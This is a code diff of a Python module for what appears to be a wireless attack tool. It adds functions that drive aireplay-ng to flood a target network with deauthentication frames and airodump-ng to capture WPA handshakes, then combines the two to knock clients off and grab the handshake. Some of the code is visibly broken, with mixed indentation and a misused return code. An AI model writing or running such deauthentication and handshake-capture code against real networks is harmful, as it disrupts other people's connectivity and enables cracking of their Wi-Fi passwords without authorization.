@@ -81,29 +81,45 @@ def showInterfaces() -> json:
 	for idx, iface in enumerate(interfaces):
 		interfacesJson[idx] = {"idx": idx, "interfaceName": iface.name()}
 	return interfacesJson
+
+
 # here we have to pass in helper obj bc of pussy parent package shit
 async def dumpAndStore(interfaceIDX: int = 0, helpersObj: object = None):
 	#try:
 	
 	# Scan for WLAN networks
-	iface.scan()
-	await asyncio.sleep(5)  # Sleep for 5 seconds before the next iteration
+    iface.scan()
+    await asyncio.sleep(5)  # Sleep for 5 seconds before the next iteration
 	# Get the scan results
-	scan_results = iface.scan_results()
+    scan_results = iface.scan_results()
     # Create a list to store the scan result data
-	scan_data = {}
-	for result in scan_results:
-		scan_data[result.ssid] ={
-		    "SSID": result.ssid,
-		    "Signal_Strength": result.signal,
-		    "BSSID": result.bssid,
-			"akm": result.akm,
-			"auth": result.auth,
-			"freq": result.freq
-		}
+    scan_data = {}
+    for result in scan_results:
+        frequency = result.freq / 1000  # Convert frequency to MHz
+        if 2400 <= frequency <= 2500:
+            # 2.4 GHz band
+            channel = (frequency - 2400) / 5 + 1
+            band = "2.4 GHz"
+        elif 5000 <= frequency <= 6000:
+            # 5 GHz band
+            channel = (frequency - 5000) / 5 + 36
+            band = "5 GHz"
+        else:
+            band = "Unknown"
+
+        scan_data[result.ssid] = {
+            "SSID": result.ssid,
+            "Signal_Strength": result.signal,
+            "BSSID": result.bssid.upper()[:-1],
+            "akm": result.akm,
+            "auth": result.auth,
+            "freq": result.freq,
+            "channel": int(channel),
+            "band": band
+        }
 
 
-	await helpersObj.database().writeToDB("scanResults", scan_data)
+    await helpersObj.database().writeToDB("scanResults", scan_data)
 
 
 	#except Exception as e:
@@ -151,10 +167,14 @@ def get_cpu_temperature():
 		return None
 def get_cpu_usage():
 	try:
-		return  round(psutil.cpu_percent(interval=1)) # Interval is in seconds
+		usage = round(psutil.cpu_percent(interval=1)) # Interval is in seconds
+		if usage <= 70:
+			return [usage, "Normal"]
+		elif usage > 70 and usage <= 80:
+			return [usage, "Critical"]
 	except Exception as e:
 		print(f"Error fetching CPU usage: {e}")
-		return None
+		return {"status": "error", "message": "Error fetching CPU usage", "error": str(e)}
 
 
 
@@ -210,14 +230,6 @@ iface {interface} inet static
 
 
 
-
-
-
-
-
-
-
-
 async def getInterfaceMode(interface_name):
 	try:
 		result = subprocess.run(["iwconfig", interface_name], capture_output=True, text=True, check=True)
@@ -231,104 +243,114 @@ async def getInterfaceMode(interface_name):
 		print("Error getting interface mode:", e)
 		return "Error"
 
+ 
 
 
-
-
-async def deauth(interface: str, ap: str, st: str, count: int):
-	try:
-        # Define the aireplay-ng command
-		deauth_command = [
-			"sudo", "aireplay-ng", "--deauth", str(count), 
-			"-a", ap, "-c", st, "--ignore-negative-one",
-			"--ignore-ts-check", "-D", "-e", "", interface
+async def listenForHandshakes(interface: str, bssid: str, timeout: int = 15):
+    try:
+        print("listening for handshake started")
+        available = subprocess.check_output('netsh wlan show network mode=bssid',stderr=subprocess.STDOUT,universal_newlines=True,shell=True)
+        # Define the airodump-ng command to capture handshakes
+        output_filename = f"Utils/handshakes/handshake_{bssid}.cap"  # Define the output filename
+        airodump_command = [
+            "sudo", "airodump-ng", "--bssid", bssid, "--write", output_filename, interface
         ]
-        # Run the deauthentication attack
-		subprocess.run(deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-		return {"status": "success", "message": f"Deauthentication attack sent to {st} connected to {ap}"}
-	except subprocess.CalledProcessError as e:
-		return {"status": "error", "message": "Error running aireplay-ng", "error": str(e)}
-	except Exception as e:
-		return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
-		
+        
+        # Start the airodump-ng process
+        airodump_process = await asyncio.create_subprocess_exec(
+            *airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
+
+        # Wait for the process to complete or timeout
+        try:
+            await asyncio.wait_for(airodump_process.wait(), timeout=timeout)
+        except asyncio.TimeoutError:
+            # Handle timeout
+            airodump_process.terminate()
+            return {"status": "error", "message": "Listening for handshakes timed out"}
+
+        # Check the return code to see if the process was successful
+        return_code = await airodump_process.returncode
+        if return_code == 0:
+            return {"status": "success", "message": f"Handshake captured and saved as {output_filename}"}
+        else:
+            return {"status": "error", "message": "Listening for handshakes failed"}
+
+    except subprocess.CalledProcessError as e:
+        return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
+    except Exception as e:
+        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
 
 
 
+async def deauthenticateNetwork(interface: str, bssid: str, timeout: int = 10, frames: int = 10):
+    try:
+        print("deauthing network started")
+        # Define the aireplay-ng command for deauthentication
+        deauth_command = [
+            "sudo", "aireplay-ng", "--deauth", frames,  
+            "-a", bssid, interface
+        ]
+        
+        # Start the aireplay-ng process
+        deauth_process = await asyncio.create_subprocess_exec(
+            *deauth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
 
-async def dump(interface: str, scan_duration: int = 5):
-	#try:
-	# Define the airodump-ng command
-    # Define the airodump-ng command
-	cmd = [
-	    "sudo", "airodump-ng", "--output-format", "csv", interface
-	]		
-	# Start airodump-ng to capture network data for the specified duration
-	process = await asyncio.create_subprocess_exec(
-	    *cmd,
-	    stdout=subprocess.PIPE,
-	    stderr=subprocess.PIPE,
-	    universal_newlines=True,
-	)		
-	# Create a list to capture the output lines
-	output_lines = []		
-	# Wait for the specified duration while capturing the output
-	await asyncio.sleep(scan_duration)		
-	# Terminate the subprocess after the specified duration
-	process.terminate()		
-	# Read the output lines as they become available
-	while True:
-		try:
-			line = await asyncio.wait_for(process.stdout.readline(), timeout=1.0)
-			if not line:
-				break
-			output_lines.append(line)
-		except asyncio.TimeoutError:
-		    # Handle a timeout if needed
-			pass		
-	# Check if the process is still running
-	if process.returncode is None:
-		# If it's still running, force termination
-		process.kill()
-		await process.wait()		
-	# Join the captured output lines
-	output = "".join(output_lines)
-	print("Command output:", output)
-	
-	#except subprocess.CalledProcessError as e:
-	#	return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
-	#except Exception as e:
-	#	return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
- 
- 
-async def captureHandshake(interface: str, bssid: str, channel: int, timeout: int = 15):
-	try:
-		# Define the airodump-ng command to target a specific network and capture a handshake
-		output_filename = f"{bssid}.cap"  # Define the output filename
-		airodump_command = [
-		    "sudo", "airodump-ng", "--output-format", "cap", "--bssid", bssid, "--channel", str(channel), "--write", output_filename, interface
-		]
-		# Start airodump-ng to capture the handshake
-		airodump_process = await asyncio.create_subprocess_exec(*airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-		# Keep track of the start time
-		start_time = time.time()
-		while True:
-		    # Check if the handshake file exists
-			if os.path.exists(output_filename):
-		        # Handshake captured
-				airodump_process.terminate()
-				return {"status": "success", "message": f"Handshake captured and saved as {output_filename}"}
-		    # Check if the timeout has been reached
-			elapsed_time = time.time() - start_time
-			if elapsed_time >= timeout:
-			    # Timeout reached, terminate airodump-ng
-				airodump_process.terminate()
-				return {"status": "error", "message": "Handshake not captured within the timeout"}
-		    # Wait for a short interval before checking again
-			await asyncio.sleep(1)
-	except subprocess.CalledProcessError as e:
-		return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
-	except Exception as e:
-		return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
+        # Wait for the process to complete or timeout
+        try:
+            await asyncio.wait_for(deauth_process.wait(), timeout=timeout)
+        except asyncio.TimeoutError:
+            # Handle timeout
+            deauth_process.terminate()
+            return {"status": "error", "message": "Deauthentication timed out"}
+
+        # Check the return code to see if the process was successful
+        return_code = await deauth_process.returncode
+        if return_code == 0:
+            return {"status": "success", "message": "Deauthentication sent successfully"}
+        else:
+            return {"status": "error", "message": "Deauthentication failed"}
+
+    except subprocess.CalledProcessError as e:
+        return {"status": "error", "message": "Error running aireplay-ng", "error": str(e)}
+    except Exception as e:
+        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
+
+
+# ok yes this part is chatgpt but hey this part was hard gimmie a break🤓
+async def captureHandshake(interface: str, bssid: str, timeout: int = 10):
+    try:
+        # YES it ends here, these are the last to sub calls to listen and capture the handshake hopefully lmao
+        
+        listening_task = asyncio.create_task(listenForHandshakes(interface, bssid))
+        deauth_task = asyncio.create_task(deauthenticateNetwork(interface, bssid, timeout))
+
+        # Wait for either task to complete
+        done, _ = await asyncio.wait([listening_task, deauth_task], return_when=asyncio.FIRST_COMPLETED)
+
+        # Cancel the other task
+        for task in done:
+            print("task done => ", task)
+            if task == listening_task:
+                deauth_task.cancel()
+            else:
+                listening_task.cancel()
+
+        # Determine which task completed
+        if listening_task.done() and listening_task.result():
+            return listening_task.result()
+        elif deauth_task.done() and deauth_task.result():
+            return deauth_task.result()
+
+        return {"status": "error", "message": "Both tasks failed to complete"}
+
+    except asyncio.CancelledError:
+        return {"status": "error", "message": "Task was cancelled"}
+    except subprocess.CalledProcessError as e:
+        return {"status": "error", "message": "Error running airodump-ng", "error": str(e)}
+    except Exception as e:
+        return {"status": "error", "message": "An unexpected error occurred", "error": str(e)}
 
 
 
